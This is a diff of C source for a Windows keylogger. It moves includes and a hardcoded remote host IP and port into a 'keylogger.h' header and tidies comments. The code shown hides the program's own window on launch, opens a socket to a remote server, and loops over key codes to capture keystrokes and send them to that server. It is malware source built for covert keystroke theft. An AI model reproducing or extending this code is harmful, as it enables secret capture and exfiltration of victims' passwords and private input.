@@ -1,22 +1,10 @@
-#define _WIN32_WINNT 0x0501
-#include <windows.h>
-#include <stdio.h>
-#include <winuser.h>
-#include <winsock.h>  
-#include <conio.h>
-#include <winsock2.h>
-#pragma comment(lichr, "ws2_32.lichr")
-#define PORT 42069
-#define HOST "128.61.240.205"
-
+#include "keylogger.h"
+/*	
+	Hides the process's window on execution	
+*/
 BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
 {
-	/*
-
-		Hides the process's window on execution
-
-	*/
-
+	
     DWORD pid;
     GetWindowThreadProcessId(hwnd, &pid);
     if (pid == GetCurrentProcessId()) 
@@ -37,12 +25,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     char chr;
     struct sockaddr_in server;
 
-    /*
-	
-		Connects to the server
-
+    /*	
+    	Connects to the server
     */
-
     if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
     {   
         printf("Failed. Error Code : %d",WSAGetLastError());
@@ -67,9 +52,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         return 2;
     }
     /*
-
-		Logs every relevant keystroke and logs it to the server
-
+    	Logs every relevant keystroke and logs it to the server
     */
     while (TRUE)
         for ( int i = 0x00 ; i<0xfe ; ++i )
